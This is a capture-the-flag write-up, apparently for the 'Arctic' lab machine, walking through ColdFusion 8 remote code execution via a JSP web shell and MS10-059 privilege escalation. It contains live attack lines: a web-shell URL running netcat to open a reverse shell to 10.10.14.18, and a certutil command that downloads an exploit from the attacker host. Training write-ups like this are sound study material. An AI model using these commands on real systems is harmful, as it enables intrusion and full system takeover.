# Arctic

## Summary

* Discovered only three open ports: RPC on 135, another MSRPC on 49154, and port 8500 running Adobe ColdFusion 8.
* Identified ColdFusion 8 as vulnerable to RCE using [Exploit-DB 50057](https://www.exploit-db.com/exploits/50057).
* Gained a reverse shell via ColdFusion’s vulnerable REST endpoint.
* Used `windows-exploit-suggester` to identify privilege escalation paths.
* Chose **MS10-059** for kernel-level privilege escalation.
* Uploaded the exploit via `certutil` and popped a SYSTEM shell.



***

## Enumeration

```bash
sudo nmap -A -sC -sV -T4 10.10.10.11 -p- -oN full_tcp.nmap
```

**Nmap Output:**

```
PORT      STATE SERVICE VERSION
135/tcp   open  msrpc   Microsoft Windows RPC
8500/tcp  open  fmtp?   (Coldfusion running here)
49154/tcp open  msrpc   Microsoft Windows RPC
```

* Visiting `http://10.10.10.11:8500` showed **Adobe ColdFusion 8** interface.
* ColdFusion 8 has known unauthenticated RCE exploits, particularly via **FCKeditor** or misconfigured endpoints.

***

## Initial Foothold

Used [Exploit-DB 50057](https://www.exploit-db.com/exploits/50057) — Adobe ColdFusion 8 RCE exploit.

* Exploit works by uploading a `.jsp` webshell via the vulnerable file upload endpoint exposed in ColdFusion 8.

Steps:

1. Modified exploit to upload reverse shell.
2.  Started a local HTTP server to host payload:

    ```bash
    bashCopyEditpython3 -m http.server 8888
    ```
3. Payload logic:
   * Upload `nc.exe` to victim using `certutil`
   * Execute it using the uploaded `.jsp` web shell

Example access:

```bash
http://10.10.10.11:8500/userfiles/file.jsp?fupload=nc64.exe&fexec=nc64.exe -e cmd 10.10.14.18 7777
```

* **Reverse shell landed on port 7777**. Initial shell was low-privilege.

***

## Privilege Escalation

Used `windows-exploit-suggester` to identify escalation paths:

```bash
python2 windows-exploit-suggester.py --database 2024-06-21-mssb.xls --systeminfo sysinfo.txt
```

* Target identified as **Windows 2008 R2 64-bit** with no installed patches.
* Chose exploit: **MS10-059** – Vulnerability in the Tracing Feature for Services.

Downloaded compiled exploit from:\
[https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS10-059/MS10-059.exe](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS10-059/MS10-059.exe)

Uploaded the executable using `certutil`:

```bash
certutil -urlcache -f http://10.10.14.18:8888/exploit.exe exploit.exe
```

Ran the exploit with a listener on port 9999:

```bash
exploit.exe 10.10.14.18 9999
```

On attacker machine:

```bash
nc -nlvp 9999
```

* **SYSTEM reverse shell established** 🎯
